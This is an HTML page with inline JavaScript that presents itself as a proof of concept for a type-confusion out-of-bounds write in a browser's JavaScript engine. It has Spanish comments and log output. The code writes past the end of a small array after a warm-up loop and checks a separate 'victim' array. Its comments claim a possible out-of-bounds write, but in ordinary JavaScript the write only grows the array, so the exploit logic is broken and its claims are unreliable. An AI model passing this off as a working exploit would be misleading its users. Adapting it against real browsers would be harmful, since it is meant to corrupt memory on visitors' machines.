<!DOCTYPE html>
<html>
<head>
  <title>Type Confusion - Out-of-Bounds Write Test</title>
</head>
<body>
  <h1>PoC: Type Confusion con OOB Write</h1>
  <pre id="log"></pre>
  <script>
    const log = (msg) => document.getElementById("log").textContent += msg + "\n";

    function trigger() {
      let oob_array = [1.1, 2.2, 3.3];
      let victim_array = [1337];

      function confuse(arr, index, val) {
        for (let i = 0; i < 10000; i++) {
          arr[0] = 1.1;
          arr[1] = 2.2;
        }
        arr[index] = val; // tipo inesperado
        return arr;
      }

      // El índice 10 está fuera de límites para oob_array
      let result = confuse(oob_array, 10, 13.37);

      log("[*] Resultado post-confusión: length = " + result.length);
      log("[*] Intentamos acceder fuera de límites: " + result[10]);

      // Intento de acceso cruzado: victim_array
      let crafted_index = 10;
      result[crafted_index] = 42.42424242;  // posible OOB write
      log("[*] ¿victim_array fue afectado?: " + victim_array[0]);
    }

    trigger();
  </script>
</body>
</html>
